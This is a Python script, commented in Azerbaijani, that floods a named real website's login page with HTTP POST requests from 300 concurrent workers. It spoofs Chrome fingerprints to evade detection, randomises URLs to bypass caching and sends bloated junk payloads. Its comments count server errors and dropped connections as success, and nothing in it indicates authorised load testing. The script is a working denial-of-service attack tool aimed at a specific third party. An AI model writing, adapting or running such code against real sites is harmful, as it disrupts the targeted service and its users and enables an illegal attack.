import asyncio
import random
import time
from curl_cffi.requests import AsyncSession

# --- CONFIG ---
TARGET = "https://empro.az/#/login"
CONCURRENCY = 300  # Railway-də RAM-ı aşmamaq üçün 300-dən başlayın
TIMEOUT = 15

async def stress_worker(worker_id):
    """Hər worker öz sessiyasını yaradır ki, barmaq izləri fərqli olsun"""
    # Railway-da TypeError-un qarşısını almaq üçün arqumentləri təmizləyirik
    async with AsyncSession(impersonate="chrome110") as session:
        while True:
            # Cache bypass üçün URL-i hər dəfə dəyişirik
            url = f"{TARGET}/?v={random.random()}&ts={time.time()}"
            
            payload = "x=" + ("A" * random.randint(1024, 10240)) # Random payload ölçüsü
            
            headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Cache-Control": "no-cache",
                "Connection": "keep-alive",
            }
            
            try:
                # HTTPv2 avtomatik aktivdir impersonate ilə
                resp = await session.post(
                    url, 
                    data=payload, 
                    headers=headers, 
                    timeout=TIMEOUT
                )
                print(f"[W-{worker_id}] Status: {resp.status_code}")
                # Əgər server 5xx verirsə, bu uğurdur
                if resp.status_code >= 500:
                    print("!!! SERVER DOWN / SLOW !!!")
            except Exception as e:
                # Bağlantı kəsilirsə server dolub deməkdir
                print(f"[W-{worker_id}] Connection reset (Target struggling)")
                await asyncio.sleep(0.5)

async def main():
    print(f"[*] Railway Worker Başlayır: {TARGET}")
    
    # Eyni anda işə düşəcək işçilər
    tasks = []
    for i in range(CONCURRENCY):
        tasks.append(asyncio.create_task(stress_worker(i)))
    
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
